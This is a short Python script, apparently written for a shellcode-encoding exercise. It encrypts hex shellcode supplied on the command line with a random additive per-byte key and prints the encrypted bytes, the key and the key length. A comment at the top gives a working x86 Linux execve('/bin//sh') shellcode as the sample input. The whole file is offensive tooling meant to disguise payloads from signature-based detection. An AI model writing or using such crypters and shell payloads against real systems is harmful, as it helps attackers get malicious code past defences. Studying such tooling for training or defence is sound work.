#!/usr/bin/python3
# -*- coding: utf-8 -*-
# run it with: 31c050682f2f7368682f62696e89e35089c25389e1b00bcd80

import sys
import random

if len(sys.argv) != 2:
	print("Enter shellcode in hex")
	sys.exit(0)

shellcode = sys.argv[1]
plain_shellcode = bytearray.fromhex(shellcode)

# Generating key
key_length = len(plain_shellcode)
r = ''.join(chr(random.randint(0,255)) for _ in range(key_length))
key = bytearray(r.encode())

encrypted_shellcode = ""
plain_key = ""

for b in range(len(plain_shellcode)):
	enc_b = (plain_shellcode[b] + key[b]) & 255
	encrypted_shellcode += '%02x' % enc_b
	plain_key += '0x'+ '%02x' % key[b] + ','

print('*'*70 + "Encrypted shellcode" + '*'*70)
print(encrypted_shellcode)
print('*'*72 + "KEY" + '*'*72)
print(plain_key)
print('*'*70 + "KEY LENGTH" + '*'*70)
print(key_length)
